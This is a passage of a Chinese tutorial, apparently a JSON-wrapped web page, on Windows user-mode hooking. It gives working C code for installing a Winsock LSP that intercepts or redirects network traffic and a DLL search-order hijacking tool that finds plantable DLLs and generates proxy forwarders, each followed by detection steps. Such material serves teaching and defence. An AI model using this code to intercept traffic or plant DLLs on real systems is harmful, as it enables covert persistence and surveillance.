检测工具审计</li></ul><hr><h2 id=\"section-107\">1.16 Winsock LSP（分层服务提供程序 Hook）</h2><h3 id=\"section-108\">技术定位</h3><p><strong>已弃用，仅向后兼容</strong>。Win10+ 推荐使用 WFP（Windows Filtering Platform）做网络过滤。LSP 仍可加载但微软不再推荐。</p><h3 id=\"section-109\">原理</h3><p>Winsock Layered Service Provider 在 Winsock API 和底层传输协议间插入自定义层。LSP DLL 被自动加载到所有使用网络的进程中（浏览器、游戏、IM 等），可拦截 <code>connect</code>/<code>send</code>/<code>recv</code> 等所有网络操作。通过 <code>WSCInstallProvider</code> API 安装，注册表位于 <code>Protocol_Catalog9</code>。</p><blockquote><p>Win10+ 虽已弃用 LSP（推荐 WFP），但为向后兼容仍然支持加载。</p></blockquote><h3 id=\"section-110\">完整实现</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n#include &lt;winsock2.h&gt;\n#include &lt;ws2spi.h&gt;\n#include &lt;sporder.h&gt;\n#include &lt;stdio.h&gt;\n\n#pragma comment(lib, \"ws2_32.lib\")\n#pragma comment(lib, \"rpcrt4.lib\")\n\nBOOL InstallLsp(const WCHAR* dllPath, const WCHAR* lspName) {\n    WSADATA wd; WSAStartup(MAKEWORD(2, 2), &amp;wd);\n\n    DWORD bufSize = 0;\nWSCEnumProtocols(NULL, NULL, &amp;bufSize, NULL);\n    LPWSAPROTOCOL_INFOW protoInfo = (LPWSAPROTOCOL_INFOW)malloc(bufSize);\nint protoCount = WSCEnumProtocols(NULL, protoInfo, &amp;bufSize, NULL);\nif (protoCount &lt;= 0) { free(protoInfo); return FALSE; }\n\n    DWORD tcpId = 0, udpId = 0;\nfor (int i = 0; i &lt; protoCount; i++) {\nif (protoInfo[i].iAddressFamily == AF_INET &amp;&amp; protoInfo[i].ProtocolChain.ChainLen == 1) {\nif (protoInfo[i].iProtocol == IPPROTO_TCP) tcpId = protoInfo[i].dwCatalogEntryId;\nif (protoInfo[i].iProtocol == IPPROTO_UDP) udpId = protoInfo[i].dwCatalogEntryId;\n        }\n    }\n\n    GUID lspGuid; UuidCreate(&amp;lspGuid);\n    WSAPROTOCOL_INFOW lspProto = protoInfo[0];\n    lspProto.ProtocolChain.ChainLen = LAYERED_PROTOCOL;\n    lspProto.dwServiceFlags1 = XP1_IFS_HANDLES;\nwcscpy_s(lspProto.szProtocol, WSAPROTOCOL_LEN + 1, lspName);\n\nint err = 0;\nif (WSCInstallProvider(&amp;lspGuid, dllPath, &amp;lspProto, 1, &amp;err) == SOCKET_ERROR) {\nfree(protoInfo); return FALSE;\n    }\n\n// 重新枚举获取 LSP Catalog ID\nfree(protoInfo); bufSize = 0;\nWSCEnumProtocols(NULL, NULL, &amp;bufSize, NULL);\n    protoInfo = (LPWSAPROTOCOL_INFOW)malloc(bufSize);\n    protoCount = WSCEnumProtocols(NULL, protoInfo, &amp;bufSize, NULL);\n\n    DWORD lspCatId = 0;\nfor (int i = 0; i &lt; protoCount; i++)\nif (!memcmp(&amp;protoInfo[i].ProviderId, &amp;lspGuid, sizeof(GUID)))\n            { lspCatId = protoInfo[i].dwCatalogEntryId; break; }\n\n// 创建协议链条目\n    WSAPROTOCOL_INFOW chains[2] = {0}; int chainCount = 0;\nif (tcpId) {\n        chains[chainCount] = protoInfo[0];\n        chains[chainCount].ProtocolChain.ChainLen = 2;\n        chains[chainCount].ProtocolChain.ChainEntries[0] = lspCatId;\n        chains[chainCount].ProtocolChain.ChainEntries[1] = tcpId;\n        chains[chainCount].iProtocol = IPPROTO_TCP;\n        chains[chainCount].iSocketType = SOCK_STREAM;\n        chainCount++;\n    }\nif (udpId) {\n        chains[chainCount] = protoInfo[0];\n        chains[chainCount].ProtocolChain.ChainLen = 2;\n        chains[chainCount].ProtocolChain.ChainEntries[0] = lspCatId;\n        chains[chainCount].ProtocolChain.ChainEntries[1] = udpId;\n        chains[chainCount].iProtocol = IPPROTO_UDP;\n        chains[chainCount].iSocketType = SOCK_DGRAM;\n        chainCount++;\n    }\n\n    GUID chainGuid; UuidCreate(&amp;chainGuid);\nWSCInstallProvider(&amp;chainGuid, dllPath, chains, chainCount, &amp;err);\n\nfree(protoInfo);\nWSACleanup();\nreturn TRUE;\n}\n\n// LSP DLL 实现\n#ifdef BUILD_LSP_DLL\nstatic WSPPROC_TABLE g_nextTable = {0};\n\nint WSPAPI LSP_WSPConnect(SOCKET s, conststruct sockaddr* name, int namelen,\n    LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS, LPINT lpErrno){\nif (name-&gt;sa_family == AF_INET) {\nstruct sockaddr_in* addr = (struct sockaddr_in*)name;\n        USHORT port = ntohs(addr-&gt;sin_port);\n        ULONG ip = ntohl(addr-&gt;sin_addr.s_addr);\n// 记录连接目标 / 阻止特定 IP:Port / 重定向流量\n// if (port == 443 &amp;&amp; ip == TARGET_IP) { *lpErrno = WSAECONNREFUSED; return SOCKET_ERROR; }\n    }\nreturn g_nextTable.lpWSPConnect(s, name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS, lpErrno);\n}\n\nint WSPAPI LSP_WSPSend(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount,\n    LPDWORD lpNumberOfBytesSent, DWORD dwFlags, LPWSAOVERLAPPED lpOverlapped,\n    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine, LPWSATHREADID lpThreadId, LPINT lpErrno){\n// 检查/修改/记录发送数据\nfor (DWORD i = 0; i &lt; dwBufferCount; i++) {\n// DLP 检查、关键词过滤、流量镜像等\n    }\nreturn g_nextTable.lpWSPSend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent,\n        dwFlags, lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);\n}\n\nint WSPAPI LSP_WSPRecv(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount,\n    LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped,\n    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine, LPWSATHREADID lpThreadId, LPINT lpErrno){\nint ret = g_nextTable.lpWSPRecv(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd,\n        lpFlags, lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);\nif (ret == 0 &amp;&amp; lpNumberOfBytesRecvd &amp;&amp; *lpNumberOfBytesRecvd &gt; 0) {\n// 检查接收内容、注入数据等\n    }\nreturn ret;\n}\n\nint WSPAPI WSPStartup(WORD wVersionRequested, LPWSPDATA lpWSPData,\n    LPWSAPROTOCOL_INFOW lpProtocolInfo, WSPUPCALLTABLE UpcallTable, LPWSPPROC_TABLE lpProcTable){\n    DWORD nextCatalogId = lpProtocolInfo-&gt;ProtocolChain.ChainEntries[1];\n\n// 查找下层协议 DLL 路径\n    DWORD bufSize = 0;\nWSCEnumProtocols(NULL, NULL, &amp;bufSize, NULL);\n    LPWSAPROTOCOL_INFOW protos = (LPWSAPROTOCOL_INFOW)malloc(bufSize);\nint count = WSCEnumProtocols(NULL, protos, &amp;bufSize, NULL);\n\n    WCHAR nextDllPath[MAX_PATH] = {0};\nint pathLen = MAX_PATH, err = 0;\nfor (int i = 0; i &lt; count; i++) {\nif (protos[i].dwCatalogEntryId == nextCatalogId) {\nWSCGetProviderPath(&amp;protos[i].ProviderId, nextDllPath, &amp;pathLen, &amp;err);\nbreak;\n        }\n    }\nfree(protos);\n\n    WCHAR expandedPath[MAX_PATH];\nExpandEnvironmentStringsW(nextDllPath, expandedPath, MAX_PATH);\n    HMODULE hNext = LoadLibraryW(expandedPath);\nif (!hNext) return WSAEPROVIDERFAILEDINIT;\n\ntypedef int (WSPAPI *WSPStartup_t)(WORD, LPWSPDATA, LPWSAPROTOCOL_INFOW, WSPUPCALLTABLE, LPWSPPROC_TABLE);\n    WSPStartup_t pNextStartup = (WSPStartup_t)GetProcAddress(hNext, \"WSPStartup\");\nif (!pNextStartup) return WSAEPROVIDERFAILEDINIT;\n\n    WSAPROTOCOL_INFOW nextInfo = *lpProtocolInfo;\n    nextInfo.dwCatalogEntryId = nextCatalogId;\nint ret = pNextStartup(wVersionRequested, lpWSPData, &amp;nextInfo, UpcallTable, lpProcTable);\nif (ret != 0) return ret;\n\n// 保存下层函数表，替换拦截点\n    g_nextTable = *lpProcTable;\n    lpProcTable-&gt;lpWSPConnect = LSP_WSPConnect;\n    lpProcTable-&gt;lpWSPSend = LSP_WSPSend;\n    lpProcTable-&gt;lpWSPRecv = LSP_WSPRecv;\nreturn 0;\n}\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {\nif (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(hModule);\nreturn TRUE;\n}\n#endif\n</code></pre><h3 id=\"section-111\">检测方法</h3><ul><li><p><code>netsh winsock show catalog</code>\n 查看已安装 LSP</p></li><li><p>扫描 <code>Protocol_Catalog9</code> 注册表异常 DLL</p></li><li><p><code>netsh winsock reset</code>\n 重置（移除所有第三方 LSP）</p></li><li><p>现代系统应使用 WFP（内核级）替代</p></li></ul><h3 id=\"section-112\">检测方法</h3><ul><li><code>netsh winsock show catalog</code> 查看已安装 LSP</li><li>扫描 <code>Protocol_Catalog9</code> 注册表异常 DLL</li><li><code>netsh winsock reset</code> 重置（移除所有第三方 LSP）</li><li>现代系统应使用 WFP（内核级）替代</li></ul><hr><h2 id=\"section-113\">1.17 DLL Search Order Hijacking（DLL 搜索顺序劫持）</h2><h3 id=\"section-114\">技术定位</h3><p><strong>常见且仍广泛使用</strong>。在 DLL 搜索路径的高优先级目录放置同名 DLL 劫持加载。合法场景包括应用代理 DLL（如 ReShade、某些插件系统）。</p><h3 id=\"section-115\">原理</h3><p>Windows 加载 DLL 时按照固定顺序搜索：</p><ol><li>应用程序自身目录（最高优先级）</li><li>System32</li><li>16 位 System 目录</li><li>Windows 目录</li><li>当前工作目录（<code>SafeDllSearchMode</code> 开启时优先级降低）</li><li>PATH 环境变量目录</li></ol><p>在高优先级目录中植入与目标 DLL 同名的文件，即可劫持加载。核心系统 DLL 受 <code>KnownDlls</code> 注册表保护（始终从 System32 加载），但第三方依赖和非 KnownDll 的系统 DLL 仍可被劫持。</p><pre data-note-kind=\"mermaid\"><code>flowchart TD\n    A[\"LoadLibrary('version.dll')\"] --&gt; B{\"应用目录有 version.dll?\"}\n    B --&gt;|是 劫持成功| C[\"加载恶意 version.dll\"]\n    B --&gt;|否| D{\"System32 有?\"}\n    D --&gt;|是| E[\"加载系统 version.dll\"]\n    D --&gt;|否| F[\"继续搜索 PATH 等\"]\n</code></pre><h3 id=\"section-116\">完整实现</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;tlhelp32.h&gt;\n\n#pragma comment(lib, \"dbghelp.lib\")\n\ntypedef struct {\n    WCHAR dllName[MAX_PATH];\n    WCHAR plantPath[MAX_PATH];\n} HIJACK_OPPORTUNITY;\n\n// 分析 PE 导入表找出可劫持的 DLL\nDWORD AnalyzeImports(const WCHAR* pePath, HIJACK_OPPORTUNITY* results, DWORD maxResults) {\n    DWORD found = 0;\n\n    HANDLE hFile = CreateFileW(pePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\nif (hFile == INVALID_HANDLE_VALUE) return 0;\n    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);\nif (!hMapping) { CloseHandle(hFile); return 0; }\n    LPVOID pBase = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);\nif (!pBase) { CloseHandle(hMapping); CloseHandle(hFile); return 0; }\n\n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pBase + pDos-&gt;e_lfanew);\n    DWORD importRva = pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;\nif (!importRva) goto cleanup;\n\n    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);\n    BYTE* importPtr = NULL;\nfor (WORD i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++) {\nif (importRva &gt;= pSec[i].VirtualAddress &amp;&amp;\n            importRva &lt; pSec[i].VirtualAddress + pSec[i].SizeOfRawData) {\n            importPtr = (BYTE*)pBase + importRva - pSec[i].VirtualAddress + pSec[i].PointerToRawData;\nbreak;\n        }\n    }\nif (!importPtr) goto cleanup;\n\n// KnownDlls: 这些 DLL 受系统保护，无法通过搜索顺序劫持\nconst char* knownDlls[] = {\n\"kernel32.dll\", \"ntdll.dll\", \"user32.dll\", \"gdi32.dll\", \"advapi32.dll\",\n\"shell32.dll\", \"ole32.dll\", \"oleaut32.dll\", \"msvcrt.dll\", \"ws2_32.dll\",\n\"comctl32.dll\", \"comdlg32.dll\", \"rpcrt4.dll\", \"secur32.dll\", \"shlwapi.dll\",\n\"setupapi.dll\", \"cfgmgr32.dll\", \"imm32.dll\", \"normaliz.dll\", NULL\n    };\n\n    WCHAR exeDir[MAX_PATH];\n    wcscpy_s(exeDir, MAX_PATH, pePath);\n    WCHAR* lastSlash = wcsrchr(exeDir, L'\\\\');\nif (lastSlash) *lastSlash = L'\\0';\n\n    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)importPtr;\nwhile (pImport-&gt;Name &amp;&amp; found &lt; maxResults) {\n        DWORD nameRva = pImport-&gt;Name;\nchar* dllNameA = NULL;\nfor (WORD i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++) {\nif (nameRva &gt;= pSec[i].VirtualAddress &amp;&amp;\n                nameRva &lt; pSec[i].VirtualAddress + pSec[i].SizeOfRawData) {\n                dllNameA = (char*)((BYTE*)pBase + nameRva - pSec[i].VirtualAddress + pSec[i].PointerToRawData);\nbreak;\n            }\n        }\nif (!dllNameA) { pImport++; continue; }\n\n// 跳过 KnownDlls\nBOOL isKnown = FALSE;\nfor (int k = 0; knownDlls[k]; k++)\nif (_stricmp(dllNameA, knownDlls[k]) == 0) { isKnown = TRUE; break; }\n\nif (!isKnown) {\n            WCHAR dllNameW[MAX_PATH];\n            MultiByteToWideChar(CP_ACP, 0, dllNameA, -1, dllNameW, MAX_PATH);\n\n// 检查应用目录是否已有该 DLL（已有则不是劫持机会）\n            WCHAR testPath[MAX_PATH];\n            swprintf_s(testPath, MAX_PATH, L\"%s\\\\%s\", exeDir, dllNameW);\n\nif (GetFileAttributesW(testPath) == INVALID_FILE_ATTRIBUTES) {\n                wcscpy_s(results[found].dllName, MAX_PATH, dllNameW);\n                wcscpy_s(results[found].plantPath, MAX_PATH, testPath);\n                found++;\n            }\n        }\n        pImport++;\n    }\n\ncleanup:\n    UnmapViewOfFile(pBase);\n    CloseHandle(hMapping);\n    CloseHandle(hFile);\nreturn found;\n}\n\n// 生成转发 DLL 的 .def 文件（所有导出转发到原始 DLL）\nBOOL GenerateForwarderDef(const WCHAR* originalDllPath, const WCHAR* outputDefPath) {\n    HMODULE hMod = LoadLibraryExW(originalDllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);\nif (!hMod) return FALSE;\n\n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + pDos-&gt;e_lfanew);\n    DWORD exportRva = pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;\nif (!exportRva) { FreeLibrary(hMod); return FALSE; }\n\n    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + exportRva);\n    DWORD* nameRvas = (DWORD*)((BYTE*)hMod + pExport-&gt;AddressOfNames);\n\n    FILE* defFile = _wfopen(outputDefPath, L\"w\");\nif (!defFile) { FreeLibrary(hMod); return FALSE; }\n\n// 获取原始 DLL 名（不含扩展名）用于转发\nchar origName[64];\n    WideCharToMultiByte(CP_ACP, 0, wcsrchr(originalDllPath, L'\\\\') + 1, -1, origName, 64, NULL, NULL);\nchar* dot = strrchr(origName, '.'); if (dot) *dot = '\\0';\n\n    fprintf(defFile, \"EXPORTS\\n\");\nfor (DWORD i = 0; i &lt; pExport-&gt;NumberOfNames; i++) {\nchar* funcName = (char*)((BYTE*)hMod + nameRvas[i]);\n// 转发格式: FuncName = OriginalDll_orig.FuncName\n        fprintf(defFile, \"    %s = %s_orig.%s\\n\", funcName, origName, funcName);\n    }\n\n    fclose(defFile);\n    FreeLibrary(hMod);\nreturn TRUE;\n}\n\n// 运行时检测：发现当前进程中被劫持的 DLL\nvoid DetectHijackedModules() {\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());\nif (hSnap == INVALID_HANDLE_VALUE) return;\n\n    WCHAR sysDir[MAX_PATH];\n    GetSystemDirectoryW(sysDir, MAX_PATH);\n\n    MODULEENTRY32W me = { sizeof(me) };\nif (Module32FirstW(hSnap, &amp;me)) {\ndo {\n// 如果模块不在系统目录中\nif (wcsstr(me.szExePath, sysDir) == NULL) {\n// 但系统目录中存在同名文件 -&gt; 可能是劫持\n                WCHAR expectedPath[MAX_PATH];\n                swprintf_s(expectedPath, MAX_PATH, L\"%s\\\\%s\", sysDir, me.szModule);\nif (GetFileAttributesW(expectedPath) != INVALID_FILE_ATTRIBUTES) {\n                    wprintf(L\"[HIJACK DETECTED] %s\\n  Loaded: %s\\n  Expected: %s\\n\",\n                        me.szModule, me.szExePath, expectedPath);\n                }\n            }\n        } while (Module32NextW(hSnap, &amp;me));\n    }\n    CloseHandle(hSnap);\n}\n\nint wmain(int argc, WCHAR* argv[]) {\nif (argc &lt; 2) {\n        wprintf(L\"DLL Search Order Hijacking Tool\\n\\n\");\n        wprintf(L\"Usage:\\n\");\n        wprintf(L\"  hijack scan &lt;target.exe&gt;    - Find hijack opportunities\\n\");\n        wprintf(L\"  hijack def &lt;dll&gt; &lt;out.def&gt;  - Generate forwarder .def\\n\");\n        wprintf(L\"  hijack detect               - Check current process\\n\");\nreturn 1;\n    }\n\nif (_wcsicmp(argv[1], L\"scan\") == 0 &amp;&amp; argc &gt;= 3) {\n        HIJACK_OPPORTUNITY results[512];\n        DWORD count = AnalyzeImports(argv[2], results, 512);\n        wprintf(L\"\\nFound %lu hijackable DLLs for %s:\\n\\n\", count, argv[2]);\nfor (DWORD i = 0; i &lt; count; i++)\n            wprintf(L\"  %-30s -&gt; %s\\n\", results[i].dllName, results[i].plantPath);\n    }\nelse if (_wcsicmp(argv[1], L\"def\") == 0 &amp;&amp; argc &gt;= 4) {\nif (GenerateForwarderDef(argv[2], argv[3]))\n            wprintf(L\"Generated: %s\\nCompile: cl /LD proxy.c /DEF:%s\\n\", argv[3], argv[3]);\nelse\n            wprintf(L\"Failed to generate .def\\n\");\n    }\nelse if (_wcsicmp(argv[1], L\"detect\") == 0) {\n        wprintf(L\"Scanning loaded modules...\\n\");\n        DetectHijackedModules();\n    }\n\nreturn 0;\n}\n</code></pre><h3 id=\"section-117\">检测方法</h3><ul><li><p>对比模块加载路径与预期系统路径</p></li><li><p>扫描应用目录中与系统 DLL 同名的可疑文件</p></li><li><p>DLL 数字签名验证（合法系统 DLL 都有微软签名）</p></li><li><p>启用 <code>SafeDllSearchMode</code>（默认开启）降低 CWD 搜索优先级</p></li><li><p><code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs</code>\n 保护核心 DLL</p></li><li><p>使用 Process Monitor 观察 DLL 加载失败路径（NAME NOT FOUND）</p></li></ul><hr><h2 id=\"section-118\">本章总结</h2><h3 id=\"section-119\">技术选型决策树</h3><pre data-note-kind=\"mermaid\"><code>flowchart TD\n    START[\"需要 Hook 什么?\"] --&gt; Q1{\"仅 Hook 本进程&lt;br/&gt;静态导入 API?\"}\n    Q1 --&gt;|是| A1[\"1.1 IAT Hook\"]\n    Q1 --&gt;|否| Q2{\"需要 Hook 任意函数&lt;br/&gt;含动态获取地址?\"}\n    Q2 --&gt;|是| A2[\"1.3 Inline Hook&lt;br/&gt;MinHook / Detours\"]\n    Q2 --&gt;|否| Q3{\"不想修改函数字节?\"}\n    Q3 --&gt;|是| A3[\"1.4 VEH Hook&lt;br/&gt;≤4 个断点\"]\n    Q3 --&gt;|否| Q4{\"需监控所有 syscall 返回?\"}\n    Q4 --&gt;|是| A4[\"1.8 Instrumentation Callback\"]\n    Q4 --&gt;|否| Q5{\"需持久化/注入?\"}\n    Q5 --&gt;|是| A5[\"1.15 COM Hijack&lt;br/&gt;1.17 DLL 侧加载&lt;br/&gt;1.12 IFEO\"]\n</code></pre><h3 id=\"section-120\">学习路径建议</h3><table><thead><tr><th>阶段</th><th>内容</th><th>目标</th></tr></thead><tbody><tr><td>第一阶段</td><td>1.1 IAT → 1.3 Inline → 1.9 Syscall</td><td>理解 PE 结构与 Hook 链路</td></tr><tr><td>第二阶段</td><td>1.4 VEH → 1.6 TLS → 1.8 Instrumentation</td><td>掌握无字节修改的 Hook</td></tr><tr><td>第三阶段</td><td>1.10 ~ 1.17 注入/劫持类</td><td>理解持久化与 DLL 加载机制</td></tr><tr><td>第四阶段</td><td>结合检测章节 + 实际工具（Detours/MinHook）</td><td>能独立完成 Hook 工程</td></tr></tbody></table><h3 id=\"section-121\">核心认知</h3><ol><li><strong>用户态 Hook 本质</strong>：修改\"调用路径\"（IAT/EAT/函数头）或\"执行时机\"（异常/回调/注入），均在 Ring 3 完成，无法对抗内核级检测。</li><li><strong>隐蔽性 ≠ 复杂度</strong>：VEH / Instrumentation Callback 隐蔽性更好，但都有明确检测面（DR 寄存器、EPROCESS 字段）。</li><li><strong>现代绕过链</strong>：攻击方用直接 syscall 绕过 ntdll Hook → 防守方在内核/ETW 层监控 → 攻击方用间接 syscall / call stack spoofing 继续对抗。用户态 Hook 只是这条链的第一环。</li><li><strong>生产建议</strong>：优先使用成熟库（Detours/MinHook），不要手写指令解析器；废弃技术（Hotpatch/LSP/AppInit）了解原理即可。</li></ol><h3 id=\"section-122\">推荐工具与资源</h3><table><thead><tr><th>资源</th><th>用途</th></tr></thead><tbody><tr><td><a href=\"https://github.com/microsoft/Detours\">Microsoft Detours</a></td><td>工业级 Inline Hook</td></tr><tr><td><a href=\"https://github.com/TsudaKageyu/minhook\">MinHook</a></td><td>轻量 Hook 库</td></tr><tr><td><a href=\"https://github.com/zyantific/zydis\">Zydis</a></td><td>指令反汇编（Trampoline 构建）</td></tr><tr><td><a href=\"https://github.com/klezVirus/SysWhispers3\">SysWhispers3</a></td><td>直接 syscall 代码生成</td></tr><tr><td>Process Monitor / x64dbg</td><td>动态分析 Hook 与 DLL 加载</td></tr><tr><td>PE-bear / CFF Explorer</td><td>静态分析 PE 导入/导出表</td></tr></tbody></table><p>参考链接：<a href=\"https://mp.weixin.qq.com/s/edRWQu4cFuXa-UZsZ92-8g\">https://mp.weixin.qq.com/s/edRWQu4cFuXa-UZsZ92-8g</a></p>",
+  "sourceHash": "2373f322ed8df0aae9c0171ed36e89fc87a658e20ac9351564e3ec288912fa53",
+  "metadata": {
+    "title": "08_Windows 全架构 Hook 技术图谱 - 用户态 Hook（Ring 3）",
+    "description": "",
+    "tags": [],
+    "sourceMetadata": {}
+  },
+  "headings": [
+    {
+      "id": "section-1",
+      "level": 1,
+      "text": "08_Windows 全架构 Hook 技术图谱 - 用户态 Hook（Ring 3）"
+    },
+    {
+      "id": "section-2",
+      "level": 2,
+      "text": "导读：用户态 Hook 技术全景"
+    },
+    {
+      "id": "section-3",
+      "level": 3,
+      "text": "技术速查对比表"
+    },
+    {
+      "id": "section-4",
+      "level": 3,
+      "text": "阅读建议"
+    },
+    {
+      "id": "section-5",
+      "level": 2,
+      "text": "1.1 IAT Hook（导入地址表 Hook）"
+    },
+    {
+      "id": "section-6",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-7",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-8",
+      "level": 3,
+      "text": "PE 背景：INT 与 IAT 的区别"
+    },
+    {
+      "id": "section-9",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-10",
+      "level": 3,
+      "text": "检测难度：★☆☆☆☆"
+    },
+    {
+      "id": "section-11",
+      "level": 3,
+      "text": "更易理解的精简示例"
+    },
+    {
+      "id": "section-12",
+      "level": 3,
+      "text": "实战要点"
+    },
+    {
+      "id": "section-13",
+      "level": 3,
+      "text": "局限"
+    },
+    {
+      "id": "section-14",
+      "level": 2,
+      "text": "1.2 EAT Hook（导出地址表 Hook）"
+    },
+    {
+      "id": "section-15",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-16",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-17",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-18",
+      "level": 3,
+      "text": "关键限制说明"
+    },
+    {
+      "id": "section-19",
+      "level": 3,
+      "text": "检测难度：★☆☆☆☆"
+    },
+    {
+      "id": "section-20",
+      "level": 3,
+      "text": "局限"
+    },
+    {
+      "id": "section-21",
+      "level": 2,
+      "text": "1.3 Inline Hook（内联 Hook / Detour）"
+    },
+    {
+      "id": "section-22",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-23",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-24",
+      "level": 3,
+      "text": "完整实现（含指令重定位引擎）"
+    },
+    {
+      "id": "section-25",
+      "level": 3,
+      "text": "检测难度：★★☆☆☆"
+    },
+    {
+      "id": "section-26",
+      "level": 3,
+      "text": "更易理解的 MinHook 用法示例"
+    },
+    {
+      "id": "section-27",
+      "level": 3,
+      "text": "工业级方案对比"
+    },
+    {
+      "id": "section-28",
+      "level": 3,
+      "text": "优点"
+    },
+    {
+      "id": "section-29",
+      "level": 3,
+      "text": "局限"
+    },
+    {
+      "id": "section-30",
+      "level": 2,
+      "text": "1.4 VEH Hook（向量化异常处理 Hook）"
+    },
+    {
+      "id": "section-31",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-32",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-33",
+      "level": 3,
+      "text": "完整实现（含多线程 DR 设置）"
+    },
+    {
+      "id": "section-34",
+      "level": 3,
+      "text": "检测难度：★★★☆☆"
+    },
+    {
+      "id": "section-35",
+      "level": 3,
+      "text": "新线程处理方案"
+    },
+    {
+      "id": "section-36",
+      "level": 3,
+      "text": "优点"
+    },
+    {
+      "id": "section-37",
+      "level": 3,
+      "text": "局限"
+    },
+    {
+      "id": "section-38",
+      "level": 2,
+      "text": "1.5 PAGE_GUARD Hook（页面守卫 Hook）"
+    },
+    {
+      "id": "section-39",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-40",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-41",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-42",
+      "level": 3,
+      "text": "检测难度：★★☆☆☆"
+    },
+    {
+      "id": "section-43",
+      "level": 3,
+      "text": "致命缺陷"
+    },
+    {
+      "id": "section-44",
+      "level": 2,
+      "text": "1.6 TLS Callback Hook"
+    },
+    {
+      "id": "section-45",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-46",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-47",
+      "level": 3,
+      "text": "TLS Callback 触发时机"
+    },
+    {
+      "id": "section-48",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-49",
+      "level": 3,
+      "text": "检测难度：★★☆☆☆"
+    },
+    {
+      "id": "section-50",
+      "level": 3,
+      "text": "用途"
+    },
+    {
+      "id": "section-51",
+      "level": 2,
+      "text": "1.7 Hotpatch Hook（热补丁 Hook）"
+    },
+    {
+      "id": "section-52",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-53",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-54",
+      "level": 3,
+      "text": "完整实现"
+    },
+    {
+      "id": "section-55",
+      "level": 3,
+      "text": "检测难度：★★☆☆☆"
+    },
+    {
+      "id": "section-56",
+      "level": 3,
+      "text": "现状说明（重要）"
+    },
+    {
+      "id": "section-57",
+      "level": 2,
+      "text": "1.8 Instrumentation Callback Hook（用户态全局 syscall 回调）"
+    },
+    {
+      "id": "section-58",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-59",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-60",
+      "level": 3,
+      "text": "完整实现（可编译 x64 ASM）"
+    },
+    {
+      "id": "section-61",
+      "level": 3,
+      "text": "检测难度：★★★☆☆"
+    },
+    {
+      "id": "section-62",
+      "level": 3,
+      "text": "优点"
+    },
+    {
+      "id": "section-63",
+      "level": 3,
+      "text": "局限"
+    },
+    {
+      "id": "section-64",
+      "level": 2,
+      "text": "1.9 Syscall Hook（用户态直接系统调用劫持）"
+    },
+    {
+      "id": "section-65",
+      "level": 3,
+      "text": "技术定位"
+    },
+    {
+      "id": "section-66",
+      "level": 3,
+      "text": "原理"
+    },
+    {
+      "id": "section-67",
+      "level": 3,
+      "text": "Hell's Gate / Halo's Gate 简要说明"
+    },
+    {
+      "id": "section-68",
+      "level": 3,
+      "text": "完整实现（含多种绕过方案）"
+    },
+    {
+      "id": "section-69",
+      "level": 3,
+      "text": "检测难度：★★☆☆☆"
+    },
+    {
